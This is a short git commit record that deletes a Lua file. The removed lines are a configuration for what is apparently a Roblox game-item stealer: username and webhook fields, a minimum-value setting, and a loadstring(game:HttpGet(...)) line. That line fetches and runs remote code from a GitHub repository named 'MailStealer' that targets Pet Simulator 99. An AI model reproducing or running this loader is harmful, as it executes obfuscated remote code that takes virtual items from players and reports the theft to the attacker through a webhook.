218de02d6dbb2ca479e37f40c86c7f759b722097
Evelynn <folder.is.back@gmail.com>
2025-06-13 19:15:46 +0200

    Delete efnjffejhdjjhhf.lua

--- efnjffejhdjjhhf.lua
+++
@@ -1,6 +0,0 @@
-Username = 'sjbdjahsa'
-Username2 = 'csnjknn'
-Webhook = 'csncsjjn'
-MinimumRAP = 1
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Ev3ly-nn/MailStealer/refs/heads/main/Protected_PetSimulator99'))()
